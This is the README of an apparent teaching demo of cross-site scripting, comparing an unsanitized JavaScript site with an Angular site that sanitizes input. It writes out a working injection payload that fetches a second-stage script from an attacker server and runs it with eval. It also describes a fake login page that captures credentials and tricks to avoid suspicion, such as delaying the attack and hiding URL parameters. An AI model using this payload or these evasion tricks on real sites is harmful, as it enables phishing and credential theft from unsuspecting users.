# Hacking Demo
This is a XSS demo that shows how an injection attack can be extended to a two-stage payload and uses social engineering to trick the user into giving credentials.

## Outline
- About injection attacks
  - Von Neumann architecture
    - Von Neumann made this discovery while working on the Manhattan Project during WWII (influenced by Alan Turing's 1937 paper)
    - Instructions stored as data made computers flexible, but is also the capability we leverage for injection attacks today
  - SQL injection is another type
- Payload
  - First stage small/generic
  - Second stage delivers the specific replacement page and how to send the credentials to the attacker
- [Features](./attacker/3vil.js)
  - Wait a couple seconds before pwning so the website looks like the real results to the user
  - Hide injection url parameters with `window.history.pushState()` to not raise suspicion

## Insecure Site
- vanilla JS site with no sanitization
- http://127.0.0.1:8080 (`./run.sh` uses [http-server](https://www.npmjs.com/package/http-server))
- malicious payload: `cool stuff<img src="img" width="1" height="1" onerror="fetch('http://127.0.0.1:8081/3vil.js').then(res => res.text()).then(resText => eval(resText))">`
- malicious link: https://bit.ly/2Mudv7e
- link details: https://bit.ly/2Mudv7e+

## Attacker Server
- serves attack payloads and captures credentials sent from the injected page
- http://127.0.0.1:8081 (`./run.sh` uses [http-server](https://www.npmjs.com/package/http-server))

## Secure Site
- Angular application using built-in sanitization)
- http://127.0.0.1:4200 (run with `ng serve`)
- same malicious payload for the secure site: https://bit.ly/2QsSywF
